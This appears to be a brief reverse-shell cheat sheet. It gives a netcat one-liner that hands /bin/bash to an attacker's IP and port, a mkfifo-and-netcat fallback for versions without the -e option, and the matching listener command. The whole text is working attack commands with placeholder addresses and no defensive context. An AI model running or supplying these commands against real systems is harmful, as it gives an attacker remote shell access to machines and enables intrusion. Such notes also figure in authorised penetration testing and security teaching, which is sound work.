# reverse shell, attacker ip and port
nc -e /bin/bash <IP> <PORT>
# no -e? bash fallback
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
# listener
nc -lvnp <port>
